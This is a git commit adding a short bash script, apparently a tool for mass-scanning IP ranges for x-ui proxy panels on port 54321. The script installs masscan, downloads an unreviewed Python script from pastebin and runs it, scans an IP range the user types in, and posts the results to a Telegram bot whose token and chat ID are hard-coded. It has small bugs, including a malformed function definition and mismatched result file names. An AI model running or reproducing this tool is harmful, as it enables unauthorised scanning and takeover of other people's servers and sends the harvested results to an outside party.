21d4abde708ddfe5a56cccc5c8db5a2faaa8185b
Aries <96482448+AriesEDGE@users.noreply.github.com>
2023-06-07 02:23:13 +0800

    Create fuckxuis.sh

---
+++ fuckxuis.sh
@@ -0,0 +1,37 @@
+#! /bin/bash
+upd(){
+    apt-get update
+    apt-get upgrade
+    apt install masscan
+    apt install libpcap-dev
+    apt install python
+    pip3 install requests
+}
+
+pyzt(){
+    curl -o xui.py https://pastebin.com/raw/RiZSfUgd
+}
+
+cvv(){
+    python3 xui.py
+}
+
+tgbots{
+    TOKEN=5677739231:AAG6zUBUJg2AQL9lxplHQBba1V5dNnVZnq4	#TG机器人token
+    chat_ID=5770708575		#用户ID或频道、群ID
+    message_text=`cat result.txt`		#要发送的信息
+    MODE='HTML'		#解析模式，可选HTML或Markdown
+    URL="https://api.telegram.org/bot${TOKEN}/sendMessage"		#api接口
+    curl -s -X POST $URL -d chat_id=${chat_ID}  -d parse_mode=${MODE} -d text="${message_text}"  >> /dev/null
+}
+upd
+pyzt
+echo "输入你的IP段"
+read sbip
+echo "输入你的最大发包数"
+read fucku
+masscan -p54321 ${sbip} --max-rate ${fucku} -oG results.txt --exclude 255.255.255.255
+cvv
+tgbots
+
+
